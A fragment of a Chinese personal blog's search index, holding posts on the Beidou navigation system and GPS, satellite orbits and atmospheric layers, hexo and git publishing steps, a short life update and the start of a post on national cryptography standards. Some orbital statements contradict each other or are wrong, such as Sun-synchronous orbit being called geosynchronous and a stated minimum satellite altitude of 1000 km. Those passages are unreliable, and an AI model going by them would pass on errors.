href=\"http://stuyang.com/blog/6fdd6732f56d/\">分组加密工作模式 - Yang‘s blog</a></li>\n<li><a href=\"https://www.asiaregister.com/zh/news/fen-zu-mi-ma-yu-liu-mi-ma-ta-men-shi-shen-me-yi-ji-ta-men-ru-he-gong-zuo-2453.htm\">分组密码与流密码：它们是什么以及它们如何工作</a></li>\n<li><a href=\"https://zh.m.wikipedia.org/zh-hans/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F\">分组密码工作模式 - WiKi</a></li>\n<li><a href=\"https://halfrost.com/symmetric_encryption/#toc-5\">漫游对称加密算法</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"nistspecialpublication800-38a.pdf\">分组密码 工作模式建议：NIST SP 800-38A 2001 Edition</a></li>\n<li><a href=\"nistspecialpublication800-38e.pdf\">分组密码 XTS-AESC 工作模式：NIST SP 800-38E 2001 Edition</a></li>\n<li><a href=\"1619-2007-NIST-Submission.pdf\">IEEE Std 1619-2007, The XTS-AES Tweakable Block Cipher</a></li>\n<li><a href=\"%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E8%8B%97%E4%BB%98%E5%8F%8B.pdf\">现代密码学理论与实践 - 苗付友</a></li>\n<li><a href=\"%E6%B5%81%E5%AF%86%E7%A0%81%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90%EF%BC%9A%E5%9B%9E%E9%A1%BE%E3%80%81%E7%8E%B0%E7%8A%B6%E4%B8%8E%E5%B1%95%E6%9C%9B.pdf\">流密码的设计与分析：回顾、现状与展望 - 张斌 &amp; 冯登国</a></li>\n</ul>\n"},{"title":"北斗卫星导航系统概述","url":"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/","content":"<p>北斗卫星导航系统（Beidou Navigation Satellite System）是中国自主研发和建设的全球卫星导航系统。该系统由一系列卫星、地面监控站和用户终端组成，旨在提供高精度、高可靠性的定位、导航和授时服务。北斗卫星导航系统的发展始于 20世纪 90 年代，经过多年的努力，目前已经成为全球四大卫星导航系统之一，与美国的 GPS、俄罗斯的 GLONASS 和欧盟的 Galilei 并列。</p>\n<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>卫星导航系统通常包含多种类型的卫星：</p>\n<ul>\n<li>MEO 中圆轨道卫星负责提供最基础的服务，但精度有限，主要作用是完成信号地标无死角的卫星信号覆盖。</li>\n<li>GEO 地球静止卫星在区域导航服务方面具有明显优势，卫星利用率高，属于导航系统中的增强系统，可以起到星间通信和地表通信功能，是提高导航定位精度的杀手锏。</li>\n<li>IGSO 倾斜地球同步轨道卫星是延伸补充，重点解决高纬度（尤其南北极地区）低仰角的问题。低仰角下的卫星信号受到大气延迟、多路径效应和观测噪声的严重影响，从而导致产生较大的误差。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"center\">类型</th>\n<th align=\"center\">轨道高度</th>\n<th align=\"center\">轨道倾角</th>\n<th align=\"center\">运行周期</th>\n<th align=\"center\">技术特点</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">GEO</td>\n<td align=\"center\">35786 km</td>\n<td align=\"center\">$0^o$</td>\n<td align=\"center\">23h56m</td>\n<td align=\"center\">位置固定，随时可用，单颗覆盖全球40%，支持短报文；<br>高纬度覆盖差，信号弱</td>\n</tr>\n<tr>\n<td align=\"center\">IGSO</td>\n<td align=\"center\">35786 km</td>\n<td align=\"center\">$55^o$</td>\n<td align=\"center\">23h56m</td>\n<td align=\"center\">与GEO相似，但可以间断性覆盖极地和高纬度地区；<br>不支持短报文，利用率略低</td>\n</tr>\n<tr>\n<td align=\"center\">MEO</td>\n<td align=\"center\">21528 km</td>\n<td align=\"center\">$55^o$</td>\n<td align=\"center\">12h50m</td>\n<td align=\"center\">高度、运行周期、信号覆盖和强度等都较为适中，<br>大气阻力略有影响，利用率一般</td>\n</tr>\n</tbody></table>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/222.jpg\" alt=\"123\"><br><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/854.jpg\" alt=\"123\"></p>\n<h3 id=\"北斗一号（验证系统）\"><a href=\"#北斗一号（验证系统）\" class=\"headerlink\" title=\"北斗一号（验证系统）\"></a>北斗一号（验证系统）</h3><p>1994 年开始建设，2000 年建成，共有 2 颗 GEO 卫星。2003 年又发射了一颗补充卫星。<br>北斗一号使用的有源定位，仅为中国境内服务。<br>2013 年，北斗一号已经光荣退休！</p>\n<h3 id=\"北斗二号（扩展的区域导航系统）\"><a href=\"#北斗二号（扩展的区域导航系统）\" class=\"headerlink\" title=\"北斗二号（扩展的区域导航系统）\"></a>北斗二号（扩展的区域导航系统）</h3><p>2004 年开始建设，2012 年建成，包含 14 颗卫星（ <code>GEO * 5 + MEO * 4 + ISGO * 5</code>），此外还有 6 颗试验或备份卫星。<br>北斗二号采取有源与无源相结合体制，服务范围为整个亚太地区。定位精度为 10 米，测速精度为 0.2 米&#x2F;秒，授时精度为 50 纳秒，短信字数每次为 120 个字。<br>目前，北斗二号与北斗三号同时使用，并完全兼容北斗三号的信号。</p>\n<h3 id=\"北斗三号（全球卫星导航系统）\"><a href=\"#北斗三号（全球卫星导航系统）\" class=\"headerlink\" title=\"北斗三号（全球卫星导航系统）\"></a>北斗三号（全球卫星导航系统）</h3><p>2009 年开始建设，2020 年建成，包含 30 颗卫星（ <code>GEO * 3 + MEO * 24 + ISGO * 3</code>），此外还有 5 颗试验或备份卫星。<br>北斗三号采取有源与无源相结合体制，服务范围为全球。定位精度为 10 米，测速精度为 0.2 米&#x2F;秒，授时精度为 20纳秒，每次短信字数也增加了。付费用户提供更高精度等级（2.5～5 米）的定位服务。<br>此外，北斗三号在载荷、星间链路、激光通信等方面也有进步。如北斗三号采用星载氢原子钟，其精度将比北斗二号的星载铷原子钟提高一个数量级。又如，北斗三号增加了卫星搜救功能和全球位置报告功能。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/bd123.jpg\" alt=\"3\"></p>\n<h2 id=\"二、北斗的信号体制\"><a href=\"#二、北斗的信号体制\" class=\"headerlink\" title=\"二、北斗的信号体制\"></a>二、北斗的信号体制</h2><p>信号体制的英文名是 signal system，它主要指的是卫星导航信号，分为四个部分，一是载波频率，二是调制方式，三是测距码，四是导航电文。信号体制是我们国内的说法，实际上它研究的是信号体制的设计、产生、实现、处理等技术。</p>\n<p>北斗-M1 是一个实验性的卫星，用于发射信号的测试和验证，并能以先占的原则确定对相应频率的使用权。北斗-M1 卫星在E2、E5B、E6频段进行信号传输，传输的信号分成2类，分别被称作“I”和“Q”。“I”的信号具有较短的编码，可能会被用来作开放服务（民用）， 而“Q”部分的编码更长，且有更强的抗干扰性，可能会被用作需要授权的服务（军用）。</p>\n<p>1 ）星座类似，均有24~30 颗卫星组成，实现全球覆盖；<br>2 ）工作频率类似，均工作在 L 波段，频率在 1164 ~ 1610 MHz 范围内；<br>3 ）采用 PRN 码进行测距定位，有粗码和精码两种码。码速率越高，定位精度越高，信号带宽越宽。<br>4 ）信号发射功率相近，信号最小接收功率在 -161 ~ -150 dBW 之间。<br>5 ）极化方式相同，发射信号均采用右旋圆极化方式。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/871.jpg\" alt=\"871\"></p>\n<p>北斗卫星提供不同频段的信号，主要包括以下频段：</p>\n<ul>\n<li>B1 频段（标准的民用定位和导航服务）：中心频率为 1561.098 MHz<ul>\n<li>B1I 频段：中心频率为 1561.098 MHz，三代、二代都支持的基础信号，简写为 B1，后续可能被 B1C 替代</li>\n<li>B1C 频段：中心频率为 1575.420 MHz，三代 M&#x2F;I 星的<strong>主推信号</strong>，适配中高档移动终端；与 GPS L1C（基础频率），Galileo E1，SBAS，日本 QZSS 信号频率一致</li>\n</ul>\n</li>\n<li>B2 频段（高精度的定位和导航服务）：中心频率为 1207.14 MHz<ul>\n<li>B2a 频段：中心频率为 1176.450 MHz，三代 M&#x2F;I 星的<strong>主推信号</strong>，适配中高档移动终端；与 GPS L5（民航导航专用）,Galileo E5a 信号频率一致。</li>\n<li>B2b 频段：中心频率为 1207.14 MHz，三代的 M&#x2F;I 星支持，适配部分 HUAWEI 移动终端；与 Galileo E5b 信号频率一致，功能相当于 GPS L2（也是双频模式，但频率不同）。</li>\n<li>B2I 频段（正在退出）：中心频率为 1207.140 MHz，仅二代星支持</li>\n</ul>\n</li>\n<li>B3 频段（特种增强型信号）：中心频率为 1268.52 MHz，三代、二代都支持</li>\n</ul>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/bd-freq.png\" alt=\"1\"></p>\n<h2 id=\"二、北斗的信号体系\"><a href=\"#二、北斗的信号体系\" class=\"headerlink\" title=\"二、北斗的信号体系\"></a>二、北斗的信号体系</h2><h2 id=\"二、北斗的定位服务\"><a href=\"#二、北斗的定位服务\" class=\"headerlink\" title=\"二、北斗的定位服务\"></a>二、北斗的定位服务</h2><p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/bd-rdss.png\" alt=\"5\"></p>\n<h2 id=\"四、北斗的短报文服务\"><a href=\"#四、北斗的短报文服务\" class=\"headerlink\" title=\"四、北斗的短报文服务\"></a>四、北斗的短报文服务</h2><p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/bd-sim.png\" alt=\"2\"><br><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/bd-sms.png\" alt=\"3\"><br><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/bd-sms-level.png\" alt=\"4\"></p>\n<h2 id=\"五、与-GPS-系统的对比分析\"><a href=\"#五、与-GPS-系统的对比分析\" class=\"headerlink\" title=\"五、与 GPS 系统的对比分析\"></a>五、与 GPS 系统的对比分析</h2><p>GPS 由美国政府拥有和运营，国防部是 GPS 的管理者，参见 <a href=\"https://www.gps.gov/\">www.gps.gov</a>。<br>GPS 初始设计为 24 个卫星，每个 8 个，位于 3 个 MEO 轨道平面，但后来修改为 6 个轨道平面，每个轨道平面有 4 颗卫星。下图以美国科罗拉多州的戈尔登市为例，显示可以看到的卫星数量如何随时间变化。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/GPS24goldenSML.gif\" alt=\"GPS-2\"></p>\n<p>影响卫星导航精度的几个关键指标：</p>\n<ul>\n<li>PDOP（Positional Dilution of Precision，位置精度因子）：描述导航卫星与用户之间相对定位关系的参数，它反映了卫星的几何分布对定位精度的影响。<br>PDOP可以按照由接收机和观测到的四颗卫星连线所组成的锥体体积来计算。一个好的定位通常要求 PDOP 值不大于 3，而大于 7 则被认为是较差的定位精度。</li>\n<li>VSN（Visible Satellite Number，可见卫星数量）：用户设备能够接收到信号并用于定位的卫星数量。为了确定三维空间中的位置和时间，VSN 必须大于或等于 4。</li>\n</ul>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/GPS.png\" alt=\"GPS\"></p>\n<p>GPS 信号有 5 个频段：</p>\n<ul>\n<li>L1：中心频率 1575.42 MHz，早期承载民用粗略码 C&#x2F;A 和加密精度码 P(Y)，现代版本采用民用码 L1C（CM+CL）和军用码 M</li>\n<li>L2：中心频率 1227.60 MHz，是第二个民用信号，承载加密精度码 P(Y)，现代版本采用民用码 L2C 和军用码 M</li>\n<li>L3：中心频率 1381.05 MHz，用于核爆炸检测项目</li>\n<li>L4：中心频率 1379.913 MHz，用于电离层误差校正的研究</li>\n<li>L5：中心频率 1176.45 MHz，是第三个民用信号。该频率属于航空导航的国际保护范围，确保没有干扰。</li>\n</ul>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/signal-1.png\" alt=\"S1\"><br><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/signal-3.png\" alt=\"S2\"><br><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/signal-2.png\" alt=\"S3\"></p>\n<p>主要技术标准如下：</p>\n<ul>\n<li><a href=\"https://www.gps.gov/technical/icwg/IS-GPS-200K.pdf\">GPS-IS-200K 接口规范，描述 L1、L2C 和 P</a></li>\n<li><a href=\"https://www.gps.gov/technical/icwg/IS-GPS-705F.pdf\">GPS-IS-705F 接口规范，描述 L5</a></li>\n<li><a href=\"https://www.gps.gov/technical/icwg/IS-GPS-800E.pdf\">GPS-IS-800E 接口规范，描述 L1C</a></li>\n</ul>\n<blockquote>\n<p>基于美国政府的“选择性可用性政策（SA）”，最初民用信号引入了故意的误差数据（军用接收器可以纠正），仅限于 100 米的平均精度。2000年，美国总统克林顿取消了该政策，民用接收机的精度提升为 5 米，双频设备可提升为 1 米。</p>\n</blockquote>\n<hr>\n<h2 id=\"附录一：地球大气层的结构\"><a href=\"#附录一：地球大气层的结构\" class=\"headerlink\" title=\"附录一：地球大气层的结构\"></a>附录一：地球大气层的结构</h2><p>按照温度来划分，地球大气层分为四个主要的层级（Layer），即：对流层、平流层、中间层和热成层。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/air.jpeg\" alt=\"air\"></p>\n<ul>\n<li>对流层（Troposphere）：是最接近地球表面的层，其高度约为 10 公里，温度为 $15^\\circ ～ -56^\\circ$。其包含了地球大气中 75% 的质量和大部分的水蒸气，天气现象主要发生在这一层。</li>\n<li>平流层（Stratosphere）：也称同温层，位于对流层之上，其高度约为 10～50 公里，温度为 $-65^\\circ ～ -2^\\circ$。其特点是<strong>温度随高度升高而增加</strong>，主要原因是臭氧层吸收太阳紫外线辐射。平流层中没有对流，风向和风速相对稳定，很适合民用飞机的巡航，军用飞机的高度也难以超过 30 公里。</li>\n<li>中间层（Mesosphere）：位于平流层之上，其高度约为 50～85 公里，温度为 $-2^\\circ ～ -86^\\circ$。其特点是<strong>温度随高度升高而降低</strong>，因为臭氧层的加热作用减弱。</li>\n<li>热成层（Thermosphere）：也称暖层，或者热层，是最外层的大气层，其高度约为 1,000 公里，温度为 $-86^\\circ ～ 1200^\\circ$。其特点是<strong>温度高达几千度</strong>，因为气体分子受到太阳紫外线辐射的强烈加热。这也是极光发生的地方。</li>\n</ul>\n<blockquote>\n<p>一般认为，100 公里高度的卡门线（Kármán line）是国家领空的上限，超过此高度的飞行器被认为是航天器</p>\n</blockquote>\n<p>热成层之上是外层空间（Exosphere），大气逐渐变得非常稀薄，直到与外太空的真空相接。外层空间没有明确的边界，气体分子可以逃逸到太空中。</p>\n<p>从其他角度看，还有几个重要的层级概念：</p>\n<ul>\n<li>臭氧层（Ozone Layer）：主要位于平流层，高度大约在 15～35 公里之间。在某些地区和条件下，臭氧分布可能延伸到对流层顶部或平流层更高处。<br>臭氧层主要由臭氧（$O_3$）分子组成，这些分子吸收太阳紫外线辐射，保护地球表面免受有害紫外线的直接照射。臭氧层的温度相对较低，但由于臭氧分子吸收紫外线辐射，这一层的温度可以比周围的大气层温度高。</li>\n<li>电离层（Ionosphere）：主要位于热成层（部分位于中间层），高度大约在 60～1000 公里，是大气层中气体分子被太阳辐射电离，形成带电粒子（离子和自由电子）的区域。<br>电离层中最显著的部分是 D层、E层和 F层，它们分别对应不同的高度和电离程度。电离层对无线电通信非常重要，因为它可以反射或折射无线电波，使得无线电信号能够跨越大距离传播。太阳活动强烈时对无线电波的传播有显著影响。</li>\n</ul>\n<h2 id=\"附录二：地球卫星轨道\"><a href=\"#附录二：地球卫星轨道\" class=\"headerlink\" title=\"附录二：地球卫星轨道\"></a>附录二：地球卫星轨道</h2><p>地球卫星作为航天器的一种，其最低轨道高度一般在 1000 公里以上。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/Comparison_satellite_navigation_orbits_zh.svg\" alt=\"轨道分布图\"></p>\n<h3 id=\"1-近地轨道（LEO）\"><a href=\"#1-近地轨道（LEO）\" class=\"headerlink\" title=\"1. 近地轨道（LEO）\"></a>1. 近地轨道（LEO）</h3><p>LEO（Low  Orbit，近地轨道，也称低地轨道），一般高度在 300～2000 公里，卫星运转周期从大约 90 分钟到几小时不等，轨道形状接近圆形。</p>\n<p>由于近地轨道卫星离地面较近，绝大多数对地观测卫星、测地卫星、空间站以及一些新的通信卫星系统（马斯克的星链、中国的星网等）都采用近地轨道。在近地轨道的物体仍然受到热气体阻力影响，因此高度通常不低于 300 公里，同时还要考虑尽量避开范艾伦辐射带。</p>\n<h3 id=\"2-中圆地球轨道（MEO）\"><a href=\"#2-中圆地球轨道（MEO）\" class=\"headerlink\" title=\"2. 中圆地球轨道（MEO）\"></a>2. 中圆地球轨道（MEO）</h3><p>MEO（Medium Earth Orbit，中地球轨道，也称中圆轨道），一般高度在 2,000~35,786 公里，卫星运转周期在 2～24 小时之间，但大部分在 12 小时左右，轨道形状接近正圆形。</p>\n<p>运行于中地球轨道的卫星大都是导航卫星，例如，格洛纳斯系统位于 19,100 公里，GPS 位于 20,200 公里，北斗卫星导航系统位于 21,500 公里，伽利略定位系统位于 23,222 公里。部分跨越南北极的通信卫星也使用中地球轨道，最早的通信卫星 Telstar 也是使用的这条轨道。</p>\n<h3 id=\"3-地球静止轨道（GEO）\"><a href=\"#3-地球静止轨道（GEO）\" class=\"headerlink\" title=\"3. 地球静止轨道（GEO）\"></a>3. 地球静止轨道（GEO）</h3><p>GEO（Geostationary Orbit，地球静止轨道，也称地球赤道同步轨道，或者正圆轨道），是指地球赤道面上方 35,786 公里的圆形轨道，卫星运转周期和地球自转周期（一恒星日，即 23 时 56 分 4 秒）相同，绕行速度约为 3.1 公里&#x2F;秒，运行方向和地球自转方向一致。<br>GEO 是地球同步轨道（Geosynchronous orbit，GSO）的一个特例，强调其相对静止的特性。</p>\n<p>在地面观测者看来，地球静止轨道卫星在天空固定不动的，因此布设 3 颗通讯卫星，即可实现除两极外的全球通讯，地面站天线只要对准卫星的定点位置就可以通讯，而不用转动天线，因此通信卫星、气象卫星和海洋监测卫星一般都运行在这个轨道。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/syn2.jpeg\" alt=\"SYN2\"></p>\n<h3 id=\"4-倾斜地球同步轨道（IGSO）\"><a href=\"#4-倾斜地球同步轨道（IGSO）\" class=\"headerlink\" title=\"4. 倾斜地球同步轨道（IGSO）\"></a>4. 倾斜地球同步轨道（IGSO）</h3><p>IGSO（Inclined Geosynchronous Orbit，倾斜地球同步轨道），也是一种地球同步轨道，其轨道高度和运转周期与 GEO 卫星相同，但其与地球赤道面的倾角不为 0 ，因此星下点轨迹是一个跨南北半球的 “8”字，与赤道相交于一点，该点常称之为交叉点。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/IGSO.png\" alt=\"IGSO\"></p>\n<h3 id=\"5-极地轨道同步轨道（SSO）\"><a href=\"#5-极地轨道同步轨道（SSO）\" class=\"headerlink\" title=\"5. 极地轨道同步轨道（SSO）\"></a>5. 极地轨道同步轨道（SSO）</h3><p>SSO（Sun-synchronous Orbit，极地轨道同步轨道，也称太阳同步轨道），也是一种地球同步轨道，其轨道平面和太阳始终保持相对固定的取向，轨道倾角接近 90 度。</p>\n<p>SSO 卫星运行时能到达南北极区上空，即卫星能飞经全球范围的上空。需要在全球范围内进行观测和应用的气象卫星、导航卫星、地球资源卫星等都采用这种轨道。<br>倾斜轨道和极地轨道同步卫星从地球上看是移动的，但每天的同一时间可以经过特定的地区，因此通常用于科研、气象或军事情报的搜集，以及两极地区和高纬度地区的通信。</p>\n<h3 id=\"6-地球同步转移轨道（GTO）\"><a href=\"#6-地球同步转移轨道（GTO）\" class=\"headerlink\" title=\"6. 地球同步转移轨道（GTO）\"></a>6. 地球同步转移轨道（GTO）</h3><p>GTO（Geostationary Transfer Orbit，地球同步转移轨道），是指近地点在 1,000 公里以下、远地点为地球同步轨道高度（约36,000 公里）的<strong>椭圆轨道</strong>。</p>\n<p>GTO 轨道是霍曼转移轨道的运用之一，经加速后可达地球静止轨道 GEO。</p>\n<h2 id=\"附录三：范艾伦辐射带\"><a href=\"#附录三：范艾伦辐射带\" class=\"headerlink\" title=\"附录三：范艾伦辐射带\"></a>附录三：范艾伦辐射带</h2><p>范艾伦辐射带，指在地球附近的近层宇宙空间中包围着地球的高能粒子辐射带，主要由地磁场中捕获的高达几兆电子伏的电子以及高达几百兆电子伏的质子组成，这些辐射会对人类身体和卫星设备造成巨大伤害。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/fushe.jpg\" alt=\"范艾伦辐射带\"></p>\n<p>范艾伦辐射带位于南北纬 $40 ^\\circ ～ 50 ^\\circ$ 之间，高度范围分两段：<strong>内辐射带</strong>的高能电子多，高度为 1,500～5,000 公里；<strong>外辐射带</strong>的高能质子多，高度为 13,000～20,000 公里，内外层之间存在范艾伦带缝，缝中辐射很少。</p>\n<p><img src=\"/2024/08/18/%E5%8C%97%E6%96%97%E5%8D%AB%E6%98%9F%E5%AF%BC%E8%88%AA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/Earth_Orbits.svg\" alt=\"demo\"></p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://mp.weixin.qq.com/s/w2rS1gADCV9N_l9FI00DMQ\">北斗卫星之杨元喜院士访谈录 - 格致论道讲坛</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/n6KjKdJiM7dNz6lJ-FUJyg\">北斗卫星之徐颖访谈录 - 格致论道讲坛</a></li>\n<li><a href=\"https://web.stanford.edu/group/scpnt/pnt/PNT11/2011_presentation_files/10_Lu-PNT2011.pdf\">北斗二号性能分析报告 - 清华大学</a></li>\n<li><a href=\"https://blog.csdn.net/Gou_Hailong/article/details/106294886\">“北斗”知多少？</a></li>\n<li><a href=\"https://blog.csdn.net/u010783226/article/details/108057660\">北斗一号、北斗二号、北斗三号的区别</a></li>\n<li><a href=\"https://www.thepaper.cn/newsDetail_forward_7979721\">北斗简史：一文读懂国产导航的26年成长路</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/698874681\">GPS 和相对论修正</a></li>\n</ul>\n<h3 id=\"相关的卫星系统\"><a href=\"#相关的卫星系统\" class=\"headerlink\" title=\"相关的卫星系统\"></a>相关的卫星系统</h3><ul>\n<li><a href=\"https://mp.weixin.qq.com/s/CIDejfzHBN-hslckMozzhw\">星链卫星(STARLINK)通信系统介绍</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Global_Positioning_System\">GPS 系统 - Wiki</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/GPS_signals\">GPS 信号 - Wiki</a></li>\n<li><a href=\"https://www.thepaper.cn/newsDetail_forward_2240440\">美持续升级GPS系统，为导航授时战做准备</a></li>\n<li><a href=\"GPS%E5%8D%AB%E6%98%9F%E4%BF%A1%E5%8F%B7%E5%8E%9F%E7%90%86.pdf\">GPS卫星信号原理</a></li>\n</ul>\n"},{"title":"又搬家了","url":"/2019/05/28/%E5%8F%88%E6%90%AC%E5%AE%B6%E4%BA%86/","content":"<p>昨天开始在北二环上班了。优点很多就不说了，至于缺点嘛……</p>\n<p>一是开车上班要90分钟，地铁也差不多，通勤很痛苦！</p>\n<p>二是物业餐饮真的不咋样，中饭25块钱，还吃不饱！</p>\n<p>慢慢适应吧:)</p>\n","tags":["生活"]},{"title":"发布blog的操作步骤","url":"/2018/12/23/%E5%8F%91%E5%B8%83blog%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4/","content":"<ol>\n<li>开启新blog</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&#x27;圣诞节怎么过？`</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><p>在 <code>/source/_posts</code>目录下发现一个新文件<code>圣诞节怎么过？.md</code>，自由编辑该文件</p>\n<blockquote>\n<p>在md文件的注释部分，可以标记category和tag，具体方法为：</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># hello-world.md</span><br><span class=\"line\">categories: 编程</span><br><span class=\"line\">tags: </span><br><span class=\"line\">    - hexo</span><br><span class=\"line\">    - github</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>文章写完了，看看效果如何，并点击<a href=\"http://localhost:4000/\">本地浏览器地址</a>看看效果如何</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo s</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>文章写的很精彩！现在，发布到<a href=\"https://nokiam9.github.io/\">blog主页</a></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo d -g</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>文章在Github上存个备份<blockquote>\n<p>如果使用vscode等IDE，可以直接点击git commit和git push的快捷方式</p>\n</blockquote>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git add .</span><br><span class=\"line\">$ git commit -m <span class=\"string\">&#x27;Updated&#x27;</span></span><br><span class=\"line\">$ git push origin hexo</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>Game Over！大吉大利，今晚吃鸡！！！</li>\n</ol>\n","categories":["编程"],"tags":["hexo","github"]},{"title":"国密标准的简介","url":"/2019/08/29/%E5%9B%BD%E5%AF%86%E6%A0%87%E5%87%86%E7%9A%84%E7%AE%80%E4%BB%8B/","content":"<h2 id=\"国密算法的概述\"><a href=\"#国密算法的概述\" class=\"headerlink\" title=\"国密算法的概述\"></a>国密算法的概述</h2><p>国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4。密钥长度和分组长度均为128位。</p>\n<p>2011年，国家密码管理局发布了《关于做好公钥密码算法升级工作的通知》，要求“自2011年3月1日起，在建和拟建公钥密码基础设施电子认证系统和密钥管理系统应使用国密算法。自2011年7月1日起，投入运行并使用公钥密码的信息系统，应使用SM2算法。”</p>\n<h2 id=\"国密SM1\"><a href=\"#国密SM1\" class=\"headerlink\" title=\"国密SM1\"></a>国密SM1</h2><p>SM1为对称加密。其加密强度与AES相当。该算法不公开，调用该算法时，需要通过加密芯片的接口进行调用。</p>\n<h2 id=\"国密SM2\"><a href=\"#国密SM2\" class=\"headerlink\" 